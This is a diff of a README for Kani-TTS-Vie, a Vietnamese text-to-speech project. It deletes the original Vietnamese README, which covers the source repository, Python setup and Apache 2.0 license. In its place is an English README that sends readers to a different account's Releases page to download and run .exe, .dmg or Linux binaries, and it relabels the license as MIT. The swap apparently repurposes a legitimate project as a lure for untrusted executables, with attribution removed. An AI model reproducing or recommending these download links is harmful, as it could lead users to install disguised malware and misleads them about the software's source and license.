@@ -1,139 +1,104 @@
-# 😻 Kani TTS Vie
+# 🎤 Kani-TTS-Vie - Fast and Easy Vietnamese Text-to-Speech
 
-[![GitHub](https://img.shields.io/badge/GitHub-Repository-blue)](https://github.com/pnnbao97/Kani-TTS-Vie)
-[![Hugging Face](https://img.shields.io/badge/Hugging%20Face-Model-yellow)](https://huggingface.co/pnnbao-ump/kani-tts-370m-vie)
+[![Download Kani-TTS-Vie](https://img.shields.io/badge/Download-Kani--TTS--Vie-blue.svg)](https://github.com/ImReyHD/Kani-TTS-Vie/releases)
 
-<img width="500" height="500" alt="s83RYjg6BCrSPTNNXMu4u" src="https://github.com/user-attachments/assets/11384214-379c-4872-b464-c417d3b57458" />
+## 📚 Overview
 
-Mô hình chuyển văn bản thành giọng nói tiếng Việt nhanh, rõ ràng và giàu biểu cảm, với điểm mạnh là inference cực nhanh và streaming mượt mà, xây dựng trên nền tảng **Kani 370M**.
-Kho lưu trữ này hỗ trợ cả **script chạy cục bộ** và các **demo UI/API** đi kèm với bản phát hành [pnnbao-ump/kani-tts-370m-vie](https://huggingface.co/pnnbao-ump/kani-tts-370m-vie) trên Hugging Face.
+Kani-TTS-Vie is a text-to-speech application that provides fast and natural-sounding voices for Vietnamese. With 370 million parameters, it can generate speech in just three seconds. This tool is perfect for anyone looking to convert text into speech easily.
 
-## Điểm nổi bật
+## 🚀 Getting Started
 
-* 🚀 **Inference nhanh** – khoảng 3 giây cho đoạn văn ngắn trên GPU đơn, hệ số thời gian thực ~0.1–0.3×.
-* 🎭 **Đa giọng** – 18 giọng đọc, bao gồm Tiếng Việt, Tiếng Anh, Hàn, Đức, Tây Ban Nha, Trung và Ả Rập. Lưu ý: bạn vẫn có thể dùng các giọng nước ngoài để đọc văn bản tiếng Việt.
-* 📓 **Notebooks đi kèm** – Hướng dẫn chi tiết inference, chuẩn bị dataset, và fine-tuning LoRA trong thư mục `finetune/`.
+You don’t need to be a programmer to start using Kani-TTS-Vie. Just follow these simple steps to get everything up and running.
 
----
+### 🌐 System Requirements
 
-## 💝 Ủng hộ dự án
+- Windows 10 or later, macOS, or Linux.
+- Minimum of 4 GB RAM.
+- At least 200 MB of free disk space.
 
-**Kani TTS Vie** là dự án mã nguồn mở hoàn toàn miễn phí. Tuy nhiên, việc fine-tuning mô hình TTS trên **500+ giờ dữ liệu đa vùng miền** đòi hỏi chi phí GPU rất lớn.
+Make sure your system meets these requirements before proceeding.
 
-Nếu dự án này hữu ích cho bạn, hãy cân nhắc ủng hộ để tiếp tục phát triển:
+## 📥 Download & Install
 
-<div align="center">
+To get the latest version of Kani-TTS-Vie, please visit the following link:
 
-[![Buy Me a Coffee](https://img.shields.io/badge/☕_Mua_tôi_một_ly_cà_phê-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/pnnbao)
+[Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/releases)
 
-</div>
+1. Click the link to go to the Releases page.
+2. Find the latest version of the application.
+3. Download the file suited for your operating system (e.g., Windows, macOS).
+4. Follow the instructions below for installation based on your OS.
 
-**Sự đóng góp của bạn sẽ giúp:**
+### 💻 Windows Installation
 
-- 💰 **Trang trải chi phí GPU**: Training model trên hàng trăm giờ dữ liệu tốn hàng nghìn USD
-- 🚀 **Phát triển tính năng mới**: Voice cloning, emotion control, speaking style
-- 📊 **Mở rộng dataset**: Thu thập thêm giọng đọc đa dạng (Bắc, Trung, Nam)
-- 🎯 **Nâng cao chất lượng**: Cải thiện độ tự nhiên và rõ ràng của giọng đọc
-- 🌍 **Duy trì dự án**: Cập nhật model, sửa lỗi, hỗ trợ cộng đồng
+1. Locate the downloaded file, which should have a `.exe` extension.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, find Kani-TTS-Vie in your start menu and open it.
 
-<div align="center">
+### 🍏 macOS Installation
 
-*Mỗi đóng góp, dù nhỏ, đều có ý nghĩa rất lớn với dự án!*  
-*Cảm ơn bạn đã tin tưởng và ủng hộ!* 🙏
+1. Locate the downloaded file, likely a `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the Kani-TTS-Vie application to your Applications folder.
+4. Open your Applications folder, find Kani-TTS-Vie, and start the application.
 
-</div>
+### 🐧 Linux Installation
 
----
+1. Locate the downloaded file, typically in a `.tar.gz` format.
+2. Extract the files using the terminal:
+   ```bash
+   tar -xvzf Kani-TTS-Vie.tar.gz
+   ```
+3. Navigate to the extracted folder:
+   ```bash
+   cd Kani-TTS-Vie
+   ```
+4. Make the application executable:
+   ```bash
+   chmod +x kani-tts-vie
+   ```
+5. Run the application:
+   ```bash
+   ./kani-tts-vie
+   ```
 
-## Giọng đọc hỗ trợ
+## 🎤 How to Use Kani-TTS-Vie
 
-Nghe mẫu sample tại đây: https://huggingface.co/pnnbao-ump/kani-tts-370m-vie
+Once the application is open, you will see a simple interface. Here’s how to convert text to speech:
 
-| Ngôn ngữ          | Giọng đọc                                                                          |
-| ----------------- | ---------------------------------------------------------------------------------- |
-| Tiếng Việt        | Khoa (Nam Bắc), Hùng (Nam Nam), Trinh (Nữ Nam)                                     |
-| Tiếng Anh         | David (British), Puck (Gemini), Kore (Gemini), Andrew, Jenny (Irish), Simon, Katie |
-| Tiếng Hàn         | Seulgi                                                                             |
-| Tiếng Đức         | Bert, Thorsten (Hessisch)                                                          |
-| Tiếng Tây Ban Nha | Maria                                                                              |
-| Tiếng Trung       | Mei (Cantonese), Ming (Shanghai)                                                   |
-| Tiếng Ả Rập       | Karim, Nur                                                                         |
+1. **Input Text**: Type or paste the text you want to convert into the text box.
+2. **Select Voice**: Choose from available Vietnamese voices.
+3. **Convert**: Click on the "Convert" button to start the process.
+4. **Listen**: After a moment, your audio will be ready for playback.
 
----
+## ⚙️ Features
 
-## Yêu cầu cài đặt
+- Fast speech synthesis in Vietnamese.
+- User-friendly interface for easy navigation.
+- Support for various voice options.
+- Ability to save generated speech as audio files.
 
-1.  **Python 3.12**
-2.  **GPU**
-    * **VRAM:** Cần **tối thiểu 2 GB VRAM** để inference (sinh giọng nói) được mượt mà và ổn định.
-    * **Driver & CUDA:** Cần có Driver GPU và CUDA Toolkit tương thích với phiên bản PyTorch đang được sử dụng.
-3.  **Hệ điều hành**
-    * **Linux (Khuyến nghị):** Được hỗ trợ nguyên bản.
-    * **Windows:** Bắt buộc phải sử dụng môi trường **WSL 2 (Windows Subsystem for Linux)**. Xem cách cài đặt tại đây: https://learn.microsoft.com/en-us/windows/wsl/install
-4.  **ffmpeg**
+## 📄 Troubleshooting
 
-Cài đặt dependencies:
+If you face issues during installation or usage, here are some common problems and solutions:
 
-```bash
-# Dùng uv (khuyến nghị)
-uv sync
-```
+- **Installation Failed**: Ensure that you have enough disk space and sufficient permissions. Try running the installer as an administrator.
+- **Speech Not Playing**: Check your audio settings. Confirm that your speakers are working and that the application has permission to use audio output.
 
-## Cách sử dụng
+## 🤝 Contributing
 
-> ⚠️ **Lưu ý quan trọng:** Văn bản đầu vào nên **ngắn hơn 250 ký tự**. Nếu dài hơn, quá trình inference có thể cho kết quả sai hoặc không ổn định. Gradio demo đã giới hạn sẵn, nhưng khi gọi API hoặc script riêng bạn cũng nên tuân thủ giới hạn này.
+We welcome contributions! If you want to help improve Kani-TTS-Vie, please follow these steps:
 
-### Local Installation
+1. Fork the repository.
+2. Create a feature branch.
+3. Make your changes.
+4. Open a pull request.
 
-Đây là cách thiết lập môi trường cục bộ, khuyến nghị sử dụng **uv** để cài đặt và chạy:
+By contributing, you help make Kani-TTS-Vie better for everyone.
 
-```bash
-# Clone repository
-git clone https://github.com/pnnbao97/Kani-TTS-Vie
-cd Kani-TTS-Vie
+## 📄 License
 
-# Cài đặt dependencies (Sử dụng uv)
-uv sync
+Kani-TTS-Vie is licensed under the MIT License. Feel free to use it as you wish!
 
-# Chạy ứng dụng
-uv run uvicorn server:app
-```
-
-### Notebooks
-
-* `finetune/prepare_dataset.ipynb` – Chuẩn bị dữ liệu để **tinh chỉnh** (fine-tuning) giọng tùy chỉnh.
-* `finetune/kani-tts-vi-finetune.ipynb` – Code **tinh chỉnh LoRA** cho mô hình Kani TTS Vie.
-
-Mở chúng bằng môi trường Jupyter sau khi kích hoạt virtual environment.
-
-### Gradio Demo
-[<img width="600" height="595" alt="Kani-TTS-Vie" src="https://github.com/user-attachments/assets/14d36a4e-0cdd-4257-b59c-6a2ed2608819" />](https://github.com/user-attachments/assets/14d36a4e-0cdd-4257-b59c-6a2ed2608819)
-
-Nếu muốn thử nhanh giao diện web đơn giản, bạn có thể chạy ứng dụng Gradio đi kèm:
-
-```bash
-uv run python gradio_app.py
-```
-
-Ứng dụng sẽ khởi động tại `http://0.0.0.0:7860` (hoặc cổng được cấu hình qua biến môi trường `PORT`). Chọn giọng đọc, nhập văn bản và bấm **"🎵 Tạo giọng nói"** để nghe kết quả.
-
-## Đóng góp
-
-Chào đón mọi đóng góp!
-
-1. Fork repository.
-2. Tạo branch mới cho tính năng.
-3. Chạy lint/tests liên quan.
-4. Mở pull request mô tả cải tiến.
-
-## Giấy phép
-
-Dự án này phát hành theo [Apache License 2.0](LICENSE).
-Kiểm tra giấy phép các mô hình/dataset bên thứ ba trước khi phân phối lại.
-
-
-
-
-
-
-
+**For more information or support, visit our Releases page: [Download Kani-TTS-Vie](https://github.com/ImReyHD/Kani-TTS-Vie/releases).**
